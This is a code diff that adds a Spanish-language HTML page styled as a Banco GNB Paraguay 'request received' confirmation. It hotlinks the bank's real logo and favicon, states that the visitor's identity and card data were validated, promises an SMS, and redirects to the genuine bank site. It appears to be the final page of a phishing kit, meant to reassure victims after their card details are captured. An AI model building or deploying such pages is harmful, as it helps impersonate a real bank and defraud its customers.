@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GNB :: Solicitud recibida</title>
+<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
+<style>
+body{margin:0;background:#EDEDED;font-family:'Open Sans',sans-serif;min-width:320px;}
+.caja{background:#fff;max-width:520px;margin:9vh auto;padding:0 0 44px;box-shadow:0 1px 4px rgba(0,0,0,.09);}
+.tope{text-align:right;padding:10px 16px 0;font-size:20px;}
+.tope a{color:#0574AF;text-decoration:none;}
+.logo{text-align:center;padding:14px 0 26px;}
+.logo img{max-width:240px;height:auto;}
+.tick{width:74px;height:74px;margin:0 auto 24px;border-radius:50%;background:#7AB83F;position:relative;animation:pop .45s ease;}
+.tick:after{content:"";position:absolute;left:26px;top:19px;width:19px;height:34px;border:solid #fff;border-width:0 5px 5px 0;transform:rotate(45deg);}
+@keyframes pop{0%{transform:scale(.4);opacity:0}100%{transform:scale(1);opacity:1}}
+h1{font-size:21px;font-weight:600;color:#22302b;text-align:center;margin:0 24px 10px;}
+.sub{text-align:center;color:#6d7275;font-size:13.5px;margin:0 30px 26px;line-height:1.6;}
+.nota{background:#f4f8f1;border:1px solid #dfe9d7;border-radius:6px;margin:0 34px;padding:14px;font-size:12.5px;color:#4e5c4a;line-height:1.6;text-align:center;}
+.btn{display:block;width:calc(100% - 68px);margin:24px auto 0;background:#0574AF;color:#fff;border:0;height:48px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;line-height:48px;text-align:center;}
+.btn:hover{background:#046290;}
+.pie{text-align:center;font-size:11px;color:#a3a8ab;margin-top:26px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="caja">
+  <div class="tope"><a href="https://www.bancognb.com.py/public/">X</a></div>
+  <div class="logo"><img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB"></div>
+
+  <div class="tick"></div>
+  <h1>Solicitud recibida correctamente</h1>
+  <p class="sub">Validamos tu identidad y tus datos fueron registrados. Ya podés operar con tu tarjeta.</p>
+
+  <div class="nota">Guardá este comprobante. En breve vas a recibir un mensaje de texto con la confirmación de la solicitud.</div>
+
+  <a class="btn" href="https://www.bancognb.com.py/public/">Finalizar</a>
+  <div class="pie">Banco GNB Paraguay · Conexión segura</div>
+</div>
+</body>
+</html>
